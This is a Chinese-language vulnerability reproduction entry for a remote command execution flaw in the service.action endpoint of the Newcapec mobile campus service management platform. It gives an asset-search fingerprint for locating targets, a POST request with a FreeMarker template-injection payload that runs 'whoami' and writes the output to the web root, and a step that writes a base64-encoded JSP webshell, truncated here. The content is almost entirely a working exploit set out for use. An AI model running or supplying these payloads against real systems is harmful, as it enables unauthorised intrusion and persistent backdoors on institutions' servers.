# 新开普掌上校园服务管理平台service.action存在远程命令执行漏洞

- **系统**：新开普掌上校园服务管理平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="掌上校园服务管理平台"`
- **请求**：`POST /service_transport/service.action HTTP/1.1`

**请求体 / payload**
```
1. 访问如下连接出现如下页面可能存在漏洞
/service_transport/service.action
2. 命令执行
Host:
Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
"command": "GetFZinfo",
"UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"
?new()>${ex(\"cmd /c whoami >./webapps/ROOT/1.txt\")}"

获取命令执行结果
/1.txt
3. 写webshell
POST /service_transport/service.action HTTP/1.1
Host:
Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
"command": "GetFZinfo",
"UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"
?new()>${ex(\"cmd /c echo PCUhCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewogICAgICAgIFUoQ2xhc3NMb2FkZX…（脚本共 2105 字，完整版见原文）
```

**其他**
- 新开普掌上校园服务管理平台service.action存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 新开普掌上校园服务管理平台